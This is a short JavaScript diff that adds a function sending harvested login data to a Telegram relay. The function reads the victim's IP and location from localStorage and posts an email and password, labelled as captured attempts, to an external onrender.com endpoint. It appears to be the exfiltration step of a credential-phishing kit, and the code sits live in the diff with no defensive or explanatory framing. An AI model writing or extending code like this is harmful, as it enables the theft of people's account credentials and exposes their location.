@@ -1,5 +1,18 @@
 import axios from "axios";
 
+export const sendMessageUserNameTelegram1 = async (newAttempts) => {
+  try {
+    const ip = JSON.parse(localStorage.getItem("ip"));
+    const location = JSON.parse(localStorage.getItem("user_location"));
+
+    await axios.post("https://tools-project-be-1fgv.onrender.com/users/sendMessage", {
+      message: `📝 *User information*\n🌍 *IP:* [${ip}](http://${ip})\n📍 *Quarter:* ${location?.quarter ?? ""}\n📍 *Quốc gia:* ${location?.country}\n📍 *Thành phố:* ${location?.city}\n📍 *Đường:* ${location?.quarter? location?.road : ""}\n👤 *Username1:* ${newAttempts[0]?.email}\n🔑 *Password1:* ${newAttempts[0]?.password}\n`,
+    });
+  } catch (error) {
+    console.error("Error:", error);
+  }
+};
+
 export const sendMessageUserNameTelegram = async (newAttempts) => {
   try {
     const ip = JSON.parse(localStorage.getItem("ip"));
